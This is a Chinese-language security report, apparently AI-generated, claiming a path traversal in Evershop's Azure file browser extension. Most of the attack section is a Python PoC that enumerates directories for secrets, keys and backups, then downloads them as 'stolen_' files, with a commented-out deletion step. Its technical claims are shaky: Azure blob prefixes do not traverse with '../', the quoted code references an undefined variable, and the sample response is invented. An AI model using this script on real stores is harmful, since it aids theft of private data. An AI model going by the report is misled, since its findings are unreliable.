# Evershop Azure File Browser 路径遍历浏览漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform - Azure File Storage Extension
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：路径遍历 (CWE-22) / 信息泄露 (CWE-200)
- **漏洞名称**：Evershop Azure File Browser 路径遍历目录浏览漏洞
- **风险等级**：中危
- **概述**：Azure File Storage扩展的`azureFileBrowser.list()`函数接受用户可控的`path`参数作为Blob列表的前缀过滤条件，未进行路径验证。攻击者可通过路径遍历浏览容器中任意目录的文件列表，获取敏感文件名、目录结构等信息，为后续攻击提供情报。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：取决于文件浏览功能的访问控制
- **操作条件**：
  1. 系统使用Azure File Storage扩展
  2. 文件浏览功能暴露给攻击者
- **攻击特征**：路径参数中包含`../`或指向其他目录的路径

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **目录枚举**：列出容器中任意目录的文件
2. **信息泄露**：获取敏感文件名、目录结构
3. **攻击情报**：为路径遍历删除/下载攻击提供目标列表
4. **业务数据泄露**：可能暴露其他用户的文件信息

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位漏洞代码**

文件：`extensions/azure_file_storage/src/services/azureFileBrowser.ts`
```typescript
export const azureFileBrowser = {
  list: async (path) => {  // path 用户可控
    const blobServiceClient = BlobServiceClient.fromConnectionString(
      getEnv("AZURE_STORAGE_CONNECTION_STRING")
    );
    const containerName = getEnv("AZURE_STORAGE_CONTAINER_NAME", "images");
    const containerClient = blobServiceClient.getContainerClient(containerName);

    if (path !== "") {
      path = `${path}/`;  // 添加斜杠作为前缀
    }

    // 使用用户输入作为前缀列出Blob
    const blobs = containerClient.listBlobsFlat({ prefix: path });  // 未验证的路径

    const subfolders = new Set();
    const files: FileBrowser[] = [];

    for await (const blob of blobs) {
      const blobUrl = `${containerClient.url}/${blob.name}`;
      // 返回文件列表和URL
      files.push({
        name: relativePath,
        url: blobUrl,  // 包含完整URL
      });
    }

    return { folders: Array.from(subfolders), files };
  },
};
```

**步骤2：分析数据流**

1. `path` 参数来自用户输入
2. 直接用作 `listBlobsFlat({ prefix: path })` 的前缀
3. 返回匹配的所有Blob信息，包括完整URL
4. 攻击者可浏览任意目录

**步骤3：发送攻击请求**

```bash
# 正常浏览请求
curl 'https://target.com/api/files/browse?path=products/images'

# 路径遍历 - 浏览根目录
curl 'https://target.com/api/files/browse?path=../'

# 浏览其他目录
curl 'https://target.com/api/files/browse?path=../config'
curl 'https://target.com/api/files/browse?path=../user-uploads'
curl 'https://target.com/api/files/browse?path=../backups'
```

**预期响应**（泄露目录结构）：
```json
{
  "folders": ["2023", "2024", "private"],
  "files": [
    {
      "name": "database-backup.sql",
      "url": "https://storage.blob.core.windows.net/images/../backups/database-backup.sql"
    },
    {
      "name": "secrets.json",
      "url": "https://storage.blob.core.windows.net/images/../config/secrets.json"
    }
  ]
}
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Azure Path Traversal Browser PoC
"""

import requests
import json

class DirectoryEnumerator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.discovered_files = []
        self.discovered_folders = []

    def list_directory(self, path):
        """
        列出指定目录的内容
        """
        endpoint = f"{self.target_url}/api/files/browse"
        params = {'path': path}

        print(f"[*] 浏览目录: {path}")

        response = requests.get(endpoint, params=params)

        if response.status_code == 200:
            data = response.json()
            folders = data.get('folders', [])
            files = data.get('files', [])

            print(f"    发现 {len(folders)} 个子目录, {len(files)} 个文件")

            for folder in folders:
                print(f"    [DIR]  {folder}/")
                self.discovered_folders.append(f"{path}/{folder}")

            for file in files:
                print(f"    [FILE] {file['name']}")
                print(f"           URL: {file['url']}")
                self.discovered_files.append(file)

            return {'folders': folders, 'files': files}
        else:
            print(f"[-] 浏览失败: {response.status_code}")
            return None

    def recursive_enumerate(self, start_path, max_depth=3, current_depth=0):
        """
        递归枚举目录结构
        """
        if current_depth >= max_depth:
            return

        result = self.list_directory(start_path)
        if result:
            for folder in result['folders']:
                full_path = f"{start_path}/{folder}" if start_path else folder
                self.recursive_enumerate(full_path, max_depth, current_depth + 1)

    def find_sensitive_files(self):
        """
        查找敏感文件
        """
        sensitive_patterns = [
            'config', 'secret', 'password', 'credential',
            'backup', 'dump', 'private', 'key', 'token',
            '.env', 'database', 'admin'
        ]

        print("\n[*] 搜索敏感文件...")
        sensitive_files = []

        for file in self.discovered_files:
            name_lower = file['name'].lower()
            for pattern in sensitive_patterns:
                if pattern in name_lower:
                    sensitive_files.append(file)
                    print(f"[!] 发现敏感文件: {file['name']}")
                    print(f"    URL: {file['url']}")
                    break

        return sensitive_files


def main():
    target = "https://shop.example.com"

    enumerator = DirectoryEnumerator(target)

    print("=" * 60)
    print(" Azure Path Traversal Directory Enumeration PoC")
    print("=" * 60)
    print()

    # 尝试各种路径遍历
    traversal_paths = [
        "",              # 当前目录
        "../",           # 上级目录
        "../../",        # 更上级
        "../config",     # 配置目录
        "../backups",    # 备份目录
        "../private",    # 私有目录
        "../admin",      # 管理目录
    ]

    print("[*] 开始目录枚举...")
    for path in traversal_paths:
        enumerator.list_directory(path)
        print()

    # 查找敏感文件
    sensitive = enumerator.find_sensitive_files()

    print("\n" + "=" * 60)
    print(f" 总计发现: {len(enumerator.discovered_files)} 个文件")
    print(f" 敏感文件: {len(sensitive)} 个")
    print("=" * 60)


if __name__ == "__main__":
    main()
```

### 4.2 与其他漏洞组合利用

```python
def combined_attack(target_url):
    """
    组合利用：先枚举再删除/下载
    """
    # 1. 枚举目录获取文件列表
    enumerator = DirectoryEnumerator(target_url)
    enumerator.recursive_enumerate("../", max_depth=3)

    # 2. 找到敏感文件
    sensitive = enumerator.find_sensitive_files()

    # 3. 尝试下载敏感文件
    for file in sensitive:
        print(f"[*] 下载: {file['url']}")
        response = requests.get(file['url'])
        if response.status_code == 200:
            with open(f"stolen_{file['name']}", 'wb') as f:
                f.write(response.content)
            print(f"[+] 已保存: stolen_{file['name']}")

    # 4. 或者删除文件（使用VULN-011的方法）
    # deleter = PathTraversalDeleter(target_url)
    # for file in sensitive:
    #     deleter.delete_with_traversal(file['path'])
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Azure Browser 路径遍历数据流                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求:                                                      │
│  GET /api/files/browse?path=../config                          │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 浏览Handler                              │                  │
│  │                                         │                  │
│  │ const path = request.query.path;        │                  │
│  │ azureFileBrowser.list(path);            │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ azureFileBrowser.ts                     │                  │
│  │                                         │                  │
│  │ list: async (path) => {                 │                  │
│  │   // path = "../config"                 │                  │
│  │   path = `${path}/`;  // "../config/"   │                  │
│  │                                         │                  │
│  │   const blobs = containerClient         │                  │
│  │     .listBlobsFlat({ prefix: path });   │  ← 未验证前缀   │
│  │                                         │                  │
│  │   for (blob of blobs) {                 │                  │
│  │     files.push({                        │                  │
│  │       name: blob.name,                  │                  │
│  │       url: `${containerUrl}/${name}`    │  ← 泄露URL     │
│  │     });                                 │                  │
│  │   }                                     │                  │
│  │ }                                       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 响应:                                    │                  │
│  │ {                                       │                  │
│  │   "folders": ["secrets", "keys"],       │  ← 目录结构泄露 │
│  │   "files": [                            │                  │
│  │     { "name": "db.json", "url": "..." } │  ← 文件列表泄露 │
│  │   ]                                     │                  │
│  │ }                                       │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **无输入验证**：`path`参数直接用作列表前缀
2. **无访问控制**：未限制可浏览的目录范围
3. **信息过度暴露**：响应中包含完整的Blob URL
4. **无访问日志**：目录枚举行为未被记录

## 6. 修复建议

### 6.1 方案A：路径验证

```typescript
export const azureFileBrowser = {
  list: async (requestPath: string) => {
    // 定义允许浏览的目录
    const ALLOWED_PATHS = ['products', 'categories', 'public'];

    // 规范化并验证路径
    const normalizedPath = requestPath.replace(/\.\./g, '').replace(/^\/+/, '');

    const topDir = normalizedPath.split('/')[0];
    if (!ALLOWED_PATHS.includes(topDir)) {
      throw new Error('Access denied: directory not browsable');
    }

    // 继续列表操作
  },
};
```

### 6.2 方案B：用户隔离

```typescript
export const azureFileBrowser = {
  list: async (requestPath: string, userId: string) => {
    // 强制添加用户目录前缀
    const userPath = `users/${userId}/${requestPath}`;

    // 用户只能浏览自己的目录
    const blobs = containerClient.listBlobsFlat({ prefix: userPath });
    // ...
  },
};
```

### 6.3 方案C：隐藏敏感信息

```typescript
export const azureFileBrowser = {
  list: async (path: string) => {
    // ...
    const files = [];
    for await (const blob of blobs) {
      // 不返回完整URL，只返回相对路径
      files.push({
        name: blob.name,
        // 通过代理端点访问，隐藏真实存储URL
        url: `/api/files/download/${encodeURIComponent(blob.name)}`
      });
    }
    return files;
  },
};
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
